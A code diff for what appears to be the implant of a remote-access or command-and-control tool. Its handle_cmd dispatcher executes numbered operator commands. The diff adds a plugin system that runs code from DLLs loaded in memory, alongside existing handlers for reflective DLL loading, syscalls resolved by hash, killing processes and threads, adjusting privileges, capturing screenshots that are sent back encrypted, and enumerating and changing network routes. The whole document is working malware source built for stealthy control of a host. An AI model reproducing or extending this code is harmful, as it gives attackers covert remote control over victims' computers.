-		DWORD offset = parser.get_int();
-		DWORD size = parser.get_int();
+		DWORD offset = parser->get_int();
+		DWORD size = parser->get_int();
 
 #ifdef  _WIN64
 		if (size == 1)
@@ -1008,63 +1022,67 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 
 		if (ptr) bResult = 1;
 
-		builder.add_byte(bResult);
-		builder.add_int(ERROR_SUCCESS);
-		builder.add_long(ptr);
+		builder->add_byte(bResult);
+		builder->add_int(ERROR_SUCCESS);
+		builder->add_long(ptr);
 		STANDART_EPILOGUE
 	}
 	if (code == 95)
 	{
 		BOOL bResult = 0;
-		LONGLONG dll_ptr = parser.get_long();
-		DWORD dll_size = parser.get_int();
+		LONGLONG dll_ptr = parser->get_long();
+		DWORD dll_size = parser->get_int();
 		auto hdll = MemoryLoadLibrary((PVOID)dll_ptr, dll_size);
 		if (hdll->initialized == TRUE) {
 			bResult = 1;
+			AcquireSRWLockExclusive(&gSRWLock);
 			mapdll_list.push_back(hdll);
+			ReleaseSRWLockExclusive(&gSRWLock);
 		}
 
 		PACK_GLE_STATUS
-			builder.add_long((LONGLONG)hdll->codeBase);
+			builder->add_long((LONGLONG)hdll->codeBase);
 		STANDART_EPILOGUE
 	}
 	if (code == 96)
 	{
 		BOOL bResult = 0;
-		LONGLONG dll_ptr = parser.get_long();
+		LONGLONG dll_ptr = parser->get_long();
+		AcquireSRWLockExclusive(&gSRWLock);
 		for (int i = 0; i < mapdll_list.size(); i++) {
-			if ((LONGLONG)(mapdll_list.at(i)->codeBase) == dll_ptr) {
+			if (mapdll_list.at(i)->codeBase == (VOID*)dll_ptr) {
 				MemoryFreeLibrary(mapdll_list.at(i));
 				mapdll_list.erase(mapdll_list.begin() + i);
 				bResult = 1;
 				break;
 			}
 		}
-
+		ReleaseSRWLockExclusive(&gSRWLock);
+		if (!bResult) SetLastError(ERROR_MOD_NOT_FOUND);
 		PACK_GLE_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 
 		STANDART_EPILOGUE
 	}
 	if (code == 97)
 	{
 		BOOL bResult = 0;
-		LONGLONG dll_ptr = parser.get_long();
-		DWORD32 name_hash = parser.get_int();
+		LONGLONG dll_ptr = parser->get_long();
+		DWORD32 name_hash = parser->get_int();
 		LONGLONG fptr = (LONGLONG)MemoryGetProcAddressP((PUCHAR)dll_ptr, name_hash);
 		if (fptr != NULL)
 		{
 			bResult = 1;
 		}
 		PACK_GLE_STATUS
-			builder.add_long(fptr);
+			builder->add_long(fptr);
 		STANDART_EPILOGUE
 	}
 	if (code == 100)
 	{
 		BOOL bResult = 0;
-		DWORD32 hash = parser.get_int();
-		int action_type = parser.get_int();
+		DWORD32 hash = parser->get_int();
+		int action_type = parser->get_int();
 		LONGLONG result = 0;
 		if (action_type == 0) {
 			result = (LONGLONG)MemoryGetModuleHandle(hash);
@@ -1075,7 +1093,7 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		if (result) bResult = 1;
 
 		PACK_GLE_STATUS
-			builder.add_long(result);
+			builder->add_long(result);
 		STANDART_EPILOGUE
 
 	}
@@ -1083,86 +1101,86 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 	{
 		BOOL bResult = 0;
 		NTSTATUS status = 0;
-		int hProcess = parser.get_int();
-		NTSTATUS code = parser.get_int();
+		int hProcess = parser->get_int();
+		NTSTATUS code = parser->get_int();
 		status = psyslib->nt_call_2arg(HASH_NtTerminateProcess, (HANDLE)hProcess, (LPVOID)code);
 		HANDLE_SYSCALL_RESULT
 		PACK_NTSTATUS_STATUS
-			builder.add_int(bResult);
+			builder->add_int(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 103)
 	{
 		BOOL bResult = 0;
 		NTSTATUS status = 0;
-		int hThread = parser.get_int();
-		NTSTATUS code = parser.get_int();
+		int hThread = parser->get_int();
+		NTSTATUS code = parser->get_int();
 		status = psyslib->nt_call_2arg(HASH_NtTerminateThread, (HANDLE)hThread, (LPVOID)code);
 		HANDLE_SYSCALL_RESULT
 			PACK_NTSTATUS_STATUS
-			builder.add_int(bResult);
+			builder->add_int(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 244)
 	{
 		NTSTATUS status = 0;
-		status = UserSyscallGate(&parser, &builder);
+		status = UserSyscallGate(parser, builder);
 		STANDART_EPILOGUE
 	}
 	if (code == 245)
 	{
 		BOOL bResult = 0;
-		INT64 size = parser.get_long();
+		INT64 size = parser->get_long();
 		LPVOID memptr = HeapAlloc(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size);
 		if (memptr) bResult = 1;
 		PACK_GLE_STATUS
-		builder.add_long((INT64)memptr);
+		builder->add_long((INT64)memptr);
 		STANDART_EPILOGUE
 	}
 	if (code == 246)
 	{
 		BOOL bResult = 0;
-		INT64 memptr = parser.get_long();
+		INT64 memptr = parser->get_long();
 		bResult = HeapFree(NtCurrentPeb()->ProcessHeap, 0, (LPVOID)memptr);
 
 		PACK_GLE_STATUS
-			builder.add_byte(bResult);
+			builder->add_byte(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 34)
 	{
 		BOOL bResult = 0;
-		DWORD32 hprocess = parser.get_int();
-		LONGLONG dll_ptr = parser.get_long();
-		DWORD32 name_hash = parser.get_int();
+		DWORD32 hprocess = parser->get_int();
+		LONGLONG dll_ptr = parser->get_long();
+		DWORD32 name_hash = parser->get_int();
 		LONGLONG fptr = (LONGLONG)GetRemoteProcAddress((HANDLE)hprocess, (HMODULE)dll_ptr, name_hash, NULL, NULL);
 		if (fptr != NULL)
 		{
 			bResult = 1;
 		}
 		PACK_GLE_STATUS
-			builder.add_long(fptr);
+			builder->add_long(fptr);
 		STANDART_EPILOGUE
 	}
 	if (code == 35)
 	{
 		BOOL bResult = 0;
-		DWORD32 hprocess = parser.get_int();
-		DWORD32 name_hash = parser.get_int();
+		DWORD32 hprocess = parser->get_int();
+		DWORD32 name_hash = parser->get_int();
 		LONGLONG fptr = (LONGLONG)GetRemoteModuleHandle((HANDLE)hprocess, name_hash);
 		if (fptr != NULL)
 		{
 			bResult = 1;
 		}
 		PACK_GLE_STATUS
-			builder.add_long(fptr);
+			builder->add_long(fptr);
 		STANDART_EPILOGUE
 	}
 	if (code == 155) 
 	{
 		BOOL bResult = 0;
-		INT64 hwnd = parser.get_long();
-		DWORD quality = parser.get_int();
+		INT64 hwnd = parser->get_long();
+		DWORD quality = parser->get_int();
 		HBITMAP hbitmap = 0;
 		PBYTE pimage = 0;
 		DWORD size = 0;
@@ -1175,34 +1193,34 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		if (!bResult) { PACK_GLE_STATUS; STANDART_EPILOGUE };
 
 		PACK_GLE_STATUS
-		ctx->netio.send_encrypted_taskresponse_big(ctx, std::vector<UCHAR>(pimage, pimage + size), &builder);
+		ctx->netio.send_encrypted_taskresponse_big(ctx, std::vector<UCHAR>(pimage, pimage + size), builder);
 
 		HeapFree(NtCurrentPeb()->ProcessHeap, 0, pimage);
 	}
 	if (code == 156)
 	{
 		BOOL bResult = 0;
-		DWORD pid = parser.get_int();
+		DWORD pid = parser->get_int();
 		HWND hwnd = FindWindowByPID(pid);
 		if (hwnd)
 		{
 			bResult = 1;
 		}
 		PACK_GLE_STATUS
-			builder.add_long((LONG64)hwnd);
+			builder->add_long((LONG64)hwnd);
 		STANDART_EPILOGUE
 	}
 	if (code == 0)
 	{
 		BOOL bResult = 1;
 		PACK_GLE_STATUS
-			builder.add_byte((char)bResult);
+			builder->add_byte((char)bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 137) {
-		DWORD handle = parser.get_int();
-		DWORD state = parser.get_int();
-		std::string privilege = parser.get_strarg();
+		DWORD handle = parser->get_int();
+		DWORD state = parser->get_int();
+		std::string privilege = parser->get_strarg();
 		bool bResult = 0;
 		TOKEN_PRIVILEGES tp;
 		LUID luid;
@@ -1213,19 +1231,19 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		NTSTATUS status = psyslib->nt_call(HASH_NtAdjustPrivilegesToken,(HANDLE)handle, FALSE, &tp, sizeof(tp), 0, 0);
 		HANDLE_SYSCALL_RESULT
 			PACK_NTSTATUS_STATUS
-			builder.add_int(bResult);
+			builder->add_int(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 138) {
-		DWORD handle = parser.get_int();
-		DWORD priv_count = parser.get_int();
+		DWORD handle = parser->get_int();
+		DWORD priv_count = parser->get_int();
 		bool bResult = 0;
 		NTSTATUS status = 0;
 		LUID luid;
 		std::vector<bool> result_array;
 		for (int i = 0; i < priv_count; i++) {
 			LUID luid = { 0,0 };
-			std::string privilege_name = parser.get_strarg();
+			std::string privilege_name = parser->get_strarg();
 			LookupPrivilegeValueA("", privilege_name.c_str(), &luid);
 			BOOL fResult = 0;
 			PRIVILEGE_SET ps = {
@@ -1238,8 +1256,8 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 			result_array.push_back(fResult);
 		}
 		PACK_NTSTATUS_STATUS
-			builder.add_int(result_array.size());
-			for (int i = 0; i < result_array.size(); i++) { builder.add_byte(result_array.at(i)); }
+			builder->add_int(result_array.size());
+			for (int i = 0; i < result_array.size(); i++) { builder->add_byte(result_array.at(i)); }
 			STANDART_EPILOGUE
 				result_array.~vector();
 	}
@@ -1265,25 +1283,25 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		{
 			bResult = TRUE;
 			PACK_GLE_STATUS
-			builder.add_strarg(pFixedInfo->HostName);
-			builder.add_strarg(pFixedInfo->DomainName);
+			builder->add_strarg(pFixedInfo->HostName);
+			builder->add_strarg(pFixedInfo->DomainName);
 			DWORD DnsServersCount = 1;
 			pAddrStr = pFixedInfo->DnsServerList.Next;
 			while (pAddrStr){
 				DnsServersCount++;
 				pAddrStr = pAddrStr->Next;
 			}
-			builder.add_int(DnsServersCount);
-			builder.add_strarg(pFixedInfo->DnsServerList.IpAddress.String);
+			builder->add_int(DnsServersCount);
+			builder->add_strarg(pFixedInfo->DnsServerList.IpAddress.String);
 			pAddrStr = pFixedInfo->DnsServerList.Next;
 			while (pAddrStr){
-				builder.add_strarg(pAddrStr->IpAddress.String);
+				builder->add_strarg(pAddrStr->IpAddress.String);
 				pAddrStr = pAddrStr->Next;
 			}
-			builder.add_int(pFixedInfo->NodeType);
-			builder.add_int(pFixedInfo->EnableRouting);
-			builder.add_int(pFixedInfo->EnableProxy);
-			builder.add_int(pFixedInfo->EnableDns);
+			builder->add_int(pFixedInfo->NodeType);
+			builder->add_int(pFixedInfo->EnableRouting);
+			builder->add_int(pFixedInfo->EnableProxy);
+			builder->add_int(pFixedInfo->EnableDns);
 
 			GlobalFree(pFixedInfo);
 		}
@@ -1327,13 +1345,13 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 			AdapterInfoCount++;
 			pAdapt = pAdapt->Next;
 		}
-		builder.add_int(AdapterInfoCount);
+		builder->add_int(AdapterInfoCount);
 		pAdapt = pAdapterInfo;
 		while (pAdapt)
 		{
-			builder.add_int(pAdapt->Type);
-			builder.add_strarg(pAdapt->AdapterName);
-			builder.add_strarg(pAdapt->Description);
+			builder->add_int(pAdapt->Type);
+			builder->add_strarg(pAdapt->AdapterName);
+			builder->add_strarg(pAdapt->Description);
 			std::string str_address;
 			for (int i = 0; i < pAdapt->AddressLength; i++)
 			{
@@ -1347,8 +1365,8 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 					str_address += "-";
 				}
 			}
-			builder.add_strarg(str_address);
-			builder.add_int(pAdapt->DhcpEnabled);
+			builder->add_strarg(str_address);
+			builder->add_int(pAdapt->DhcpEnabled);
 
 			pAddrStr = &(pAdapt->IpAddressList);
 			while (pAddrStr)
@@ -1356,12 +1374,12 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 				AdapterAddrInfoCount++;
 				pAddrStr = pAddrStr->Next;
 			}
-			builder.add_int(AdapterAddrInfoCount);
+			builder->add_int(AdapterAddrInfoCount);
 			pAddrStr = &(pAdapt->IpAddressList);
 			while (pAddrStr)
 			{
-				builder.add_strarg(pAddrStr->IpAddress.String);
-				builder.add_strarg(pAddrStr->IpMask.String);
+				builder->add_strarg(pAddrStr->IpAddress.String);
+				builder->add_strarg(pAddrStr->IpMask.String);
 				pAddrStr = pAddrStr->Next;
 			}
 			AdapterGatewayCount = 1;
@@ -1371,16 +1389,16 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 				AdapterGatewayCount++;
 				pAddrStr = pAddrStr->Next;
 			}
-			builder.add_int(AdapterGatewayCount);
-			builder.add_strarg(pAdapt->GatewayList.IpAddress.String);
+			builder->add_int(AdapterGatewayCount);
+			builder->add_strarg(pAdapt->GatewayList.IpAddress.String);
 			pAddrStr = pAdapt->GatewayList.Next;
 			while (pAddrStr)
 			{
-				builder.add_strarg(pAddrStr->IpAddress.String);
+				builder->add_strarg(pAddrStr->IpAddress.String);
 				pAddrStr = pAddrStr->Next;
 			}
 
-			builder.add_strarg(pAdapt->DhcpServer.IpAddress.String);
+			builder->add_strarg(pAdapt->DhcpServer.IpAddress.String);
 			pAdapt = pAdapt->Next;
 
 			AdapterInfoCount = 0;
@@ -1392,7 +1410,7 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 	}
 	if (code == 68) {
 		BOOL bResult = 0;
-		DWORD family = parser.get_int();
+		DWORD family = parser->get_int();
 		PMIB_IPFORWARD_TABLE2 pTable = 0;
 		NTSTATUS status = GetIpForwardTable2(family, &pTable);
 		if (status != NULL) {
@@ -1402,7 +1420,7 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		}
 		bResult = TRUE;
 		PACK_GLE_STATUS
-		builder.add_int(pTable->NumEntries);
+		builder->add_int(pTable->NumEntries);
 		for (int i = 0; i < pTable->NumEntries; i++)
 		{
 			MIB_IPFORWARD_ROW2* row = &pTable->Table[i];
@@ -1411,18 +1429,18 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 			{
 				IN_ADDR netmask;
 				ConvertLengthToIpv4Mask(row->DestinationPrefix.PrefixLength, &netmask.S_un.S_addr);
-				builder.add_strarg(_inet_ntoa((char*)&row->DestinationPrefix.Prefix.Ipv4.sin_addr));
-				builder.add_strarg(_inet_ntoa((char*)&netmask));
-				builder.add_strarg(_inet_ntoa((char*)&row->NextHop.Ipv4.sin_addr));
-				builder.add_strarg(lookup_iface_addr(row->InterfaceIndex));
-				builder.add_int(row->InterfaceIndex);
+				builder->add_strarg(_inet_ntoa((char*)&row->DestinationPrefix.Prefix.Ipv4.sin_addr));
+				builder->add_strarg(_inet_ntoa((char*)&netmask));
+				builder->add_strarg(_inet_ntoa((char*)&row->NextHop.Ipv4.sin_addr));
+				builder->add_strarg(lookup_iface_addr(row->InterfaceIndex));
+				builder->add_int(row->InterfaceIndex);
 
 				iface_row.InterfaceIndex = row->InterfaceIndex;
 				iface_row.Family = family;
 				GetIpInterfaceEntry(&iface_row);
 
-				builder.add_int(row->Metric + iface_row.Metric);
-				builder.add_int(row->Origin);
+				builder->add_int(row->Metric + iface_row.Metric);
+				builder->add_int(row->Origin);
 			}
 		}
 		STANDART_EPILOGUE
@@ -1430,13 +1448,13 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 	if (code == 81) {
 		BOOL bResult = FALSE;
 		DWORD status = 0;
-		DWORD action = parser.get_int();
-		DWORD family = parser.get_int();
-		std::string dest_addr = parser.get_strarg();
-		std::string gateway_addr = parser.get_strarg();
-		std::string netmask = parser.get_strarg();
-		DWORD iface_idx = parser.get_int();
-		DWORD metric = parser.get_int();
+		DWORD action = parser->get_int();
+		DWORD family = parser->get_int();
+		std::string dest_addr = parser->get_strarg();
+		std::string gateway_addr = parser->get_strarg();
+		std::string netmask = parser->get_strarg();
+		DWORD iface_idx = parser->get_int();
+		DWORD metric = parser->get_int();
 
 		MIB_IPFORWARD_ROW2 new_row = { 0 };
 		InitializeIpForwardEntry(&new_row);
@@ -1465,11 +1483,143 @@ NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
 		if (status == NULL) bResult = TRUE;
 
 		PACK_NTSTATUS_STATUS
-		builder.add_byte(bResult);
+		builder->add_byte(bResult);
 		STANDART_EPILOGUE
 	}
 	if (code == 67) {
-	
+		LONGLONG ext_init_proc = 0;
+		PEXTENSION_OBJECT ext_obj = 0;
+
+		BOOL bResult = 0;
+		LONGLONG ext_base = parser->get_long();
+		
+		PMEMORYMODULE ext_module = NULL;
+		AcquireSRWLockShared(&gSRWLock);
+		for (int i = 0; i < mapdll_list.size(); i++)
+		{
+			if ((LONGLONG)(mapdll_list.at(i)->codeBase) == ext_base) {
+				ext_module = mapdll_list.at(i);
+				break;
+			}
+		}
+		ReleaseSRWLockShared(&gSRWLock);
+		if (ext_module == 0){
+			bResult = 0;
+			SetLastError(ERROR_MOD_NOT_FOUND);
+			goto FINISH_EXT_REG_REQUEST;
+		}
+		ext_init_proc = (LONGLONG)MemoryGetProcAddress(ext_module, HASH_RegisterExt);
+		if (ext_init_proc == NULL)
+		{
+			bResult = 0;
+			SetLastError(ERROR_PROC_NOT_FOUND);
+			goto FINISH_EXT_REG_REQUEST;
+		}
+		ext_obj = (PEXTENSION_OBJECT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(EXTENSION_OBJECT));
+		ext_obj->ext_base = (LONGLONG)ext_module->codeBase;
+		((NTSTATUS(*)(PMODULE_CONTEXT, PEXTENSION_OBJECT))ext_init_proc)(ctx, ext_obj);
+
+		for (int i = 0; i < extension_list.size(); i++) {
+			if (extension_list[i]->ext_uid == ext_obj->ext_uid) {
+				SetLastError(ERROR_OBJECT_ALREADY_EXISTS);
+				bResult = 0;
+				goto FINISH_EXT_REG_REQUEST;
+			}
+		}
+
+		extension_list.push_back(ext_obj);
+		bResult = 1;
+FINISH_EXT_REG_REQUEST:
+		PACK_GLE_STATUS
+			if (bResult) builder->add_long(ext_obj->ext_uid);
+			else builder->add_long(NULL);
+		STANDART_EPILOGUE
 	}
+	if (code == 72) {
+		bool bResult = 0;
+		DWORD ext_count = extension_list.size();
+		bResult = 1;
+
+		PACK_GLE_STATUS
+		builder->add_int(ext_count);
+		for (int i = 0; i < ext_count; i++){
+			builder->add_long(extension_list[i]->ext_uid);
+			builder->add_long(extension_list[i]->ext_base);
+		}
+		STANDART_EPILOGUE
+	}
+	if (code == 73) {
+		bool bResult = 0;
+		LONGLONG ext_uid = parser->get_long();
+		AcquireSRWLockExclusive(&gSRWLock);
+		for (int i = 0; i < extension_list.size(); i++) {
+			if (extension_list[i]->ext_uid == ext_uid) {
+				extension_list.erase(extension_list.begin() + i);
+				bResult = 1;
+				break;
+			}
+		}
+		ReleaseSRWLockExclusive(&gSRWLock);
+		if (!bResult) SetLastError(ERROR_MOD_NOT_FOUND);
+
+		PACK_GLE_STATUS
+			builder->add_byte(bResult);
+		STANDART_EPILOGUE
+	}
+	if (code == 78) {
+		bool bResult = 0;
+		LONGLONG ext_uid = parser->get_long();
+		LONGLONG proc_uid = parser->get_long();
+		EXTENSION_OBJECT *ext_module = NULL;
+		NTSTATUS ext_proc_status = 0;
+		LONGLONG ext_proc_ptr = 0;
+		AcquireSRWLockShared(&gSRWLock);
+		for (int i = 0; i < extension_list.size(); i++) {
+			if (extension_list[i]->ext_uid == ext_uid) {
+				bResult = 1;
+				ext_module = extension_list[i];
+				break;
+			}
+		}
+		if (ext_module == NULL){
+			bResult = 0;
+			SetLastError(ERROR_MOD_NOT_FOUND);
+			goto FINISH_EXT_API_EXECUTION;
+		}
+		for (int i = 0; i < ext_module->api_table.size(); i++)
+		{
+			if (ext_module->api_table[i].api_uid == proc_uid)
+			{
+				bResult = 1;
+				ext_proc_ptr = ext_module->api_table[i].api_ptr;
+				break;
+			}
+		}
+		if (ext_proc_ptr == NULL){
+			bResult = 0;
+			SetLastError(ERROR_PROC_NOT_FOUND);
+			goto FINISH_EXT_API_EXECUTION;
+		}
+
+FINISH_EXT_API_EXECUTION:
+		ReleaseSRWLockShared(&gSRWLock);
+
+
+		PACK_GLE_STATUS
+			if (ext_proc_ptr) {
+				try{
+					ext_proc_status = ((NTSTATUS(*)(CommandParser*, ResponseBuilder*))ext_proc_ptr)(parser, builder);
+				}
+				catch (std::exception&) {
+					ext_proc_status = ERROR_EXCEPTION_IN_RESOURCE_CALL;
+				}
+			}
+			
+		builder->add_long(ext_proc_status);
+		STANDART_EPILOGUE
+	}
+
+	delete builder;
+	delete parser;
 	return 0;
 }
